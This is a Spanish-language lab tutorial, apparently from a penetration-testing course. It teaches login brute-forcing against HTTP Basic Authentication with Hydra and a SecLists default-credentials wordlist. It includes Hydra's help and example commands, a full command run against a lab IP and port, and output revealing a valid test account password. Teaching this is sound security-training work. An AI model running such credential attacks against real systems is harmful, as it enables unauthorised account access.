Las contraseñas predeterminadas a menudo se utilizan para cuentas de usuario con fines de prueba. Son fáciles de recordar y también se utilizan para cuentas predeterminadas de servicios y aplicaciones destinadas a simplificar el primer acceso. No es raro que tales cuentas de usuario sean pasadas por alto u olvidadas. Debido a la pereza natural del ser humano, todos intentan hacerlo lo más cómodo posible. Esto, a su vez, lleva a la falta de atención y a los errores resultantes, que pueden dañar la infraestructura de la empresa.

Como vimos cuando visitamos el sitio web, solicitó el formulario de `Basic HTTP Authentication` para ingresar el nombre de usuario y la contraseña. Basic HTTP Authentication generalmente responde con un código de respuesta HTTP `401 Unauthorized`. Como mencionamos anteriormente, recurriremos a un ataque de Brute Forcing, ya que no tenemos suficiente información para intentar un tipo diferente de ataque, que cubriremos en esta sección.

---

## Hydra

`Hydra` es una herramienta útil para Login Brute Forcing, ya que cubre una amplia variedad de ataques y servicios y es relativamente rápida en comparación con otras. Puede probar cualquier par de credenciales y verificar si son exitosas o no, pero en grandes cantidades y de manera muy rápida.

Si queremos usarla en nuestra propia máquina, podemos usar "`apt install hydra -y`" o descargarla y usarla desde su [Github Repository](https://github.com/vanhauser-thc/thc-hydra), pero está preinstalada en Pwnbox.

Podemos echar un vistazo a las opciones que `hydra` proporciona y ver sus flags y ejemplos de cómo se puede usar:

```r
hydra -h

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
<...SNIP...>
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -u        loop around users, not passwords (effective! implied with -x)
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)

<...SNIP...>

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```

---

## Default Passwords

Como no sabemos qué usuario brute force, tendremos que brute force ambos campos. Podemos proporcionar diferentes wordlists para los nombres de usuario y las contraseñas e iterar sobre todas las combinaciones posibles de nombres de usuario y contraseñas. Sin embargo, deberíamos dejar esto como último recurso.

Es muy común encontrar pares de nombres de usuario y contraseñas utilizados juntos, especialmente cuando las contraseñas predeterminadas del servicio se mantienen sin cambios. Por eso es mejor comenzar siempre con una wordlist de tales pares de credenciales -por ejemplo, `test:test`-, y escanear todos ellos primero.

Esto no debería tomar mucho tiempo, y si no pudimos encontrar ningún par funcional, pasaríamos a usar wordlists separadas para cada uno o buscaríamos las 100 contraseñas más comunes que se puedan usar.

Podemos encontrar una lista de pares de inicio de sesión con contraseñas predeterminadas en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists), específicamente en el directorio `/opt/useful/SecLists/Passwords/Default-Credentials` dentro de Pwnbox. En este caso, elegiremos `ftp-betterdefaultpasslist.txt`, ya que parece ser el más relevante para nuestro caso, ya que contiene una variedad de combinaciones predeterminadas de usuario/contraseña. Utilizaremos las siguientes flags, basadas en la página de ayuda anterior:

|**Options**|**Description**|
|---|---|
|`-C ftp-betterdefaultpasslist.txt`|Combined Credentials Wordlist|
|`SERVER_IP`|Target IP|
|`-s PORT`|Target Port|
|`http-get`|Request Method|
|`/`|Target Path|

El comando ensamblado resulta:

```r
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Es bastante común que los administradores pasen por alto cuentas de prueba o predeterminadas y sus credenciales. Por eso siempre se recomienda comenzar escaneando credenciales predeterminadas, ya que muy a menudo se dejan sin cambios. Incluso vale la pena probar manualmente las 3-5 credenciales predeterminadas más comunes, ya que muy a menudo se encuentran en uso.

Podemos visitar el sitio web nuevamente y probar el mismo par para verificar que funcionan:

`http://178.211.23.155:31099/`

![](https://academy.hackthebox.com/storage/modules/57/bruteforcing_index.jpg)

Como podemos ver, obtenemos acceso, y el par de credenciales funciona. A continuación, podemos intentar realizar el segundo tipo de escaneo mediante wordlists separadas para nombres de usuario y contraseñas y ver cuánto tiempo toma encontrar el mismo par que acabamos de identificar.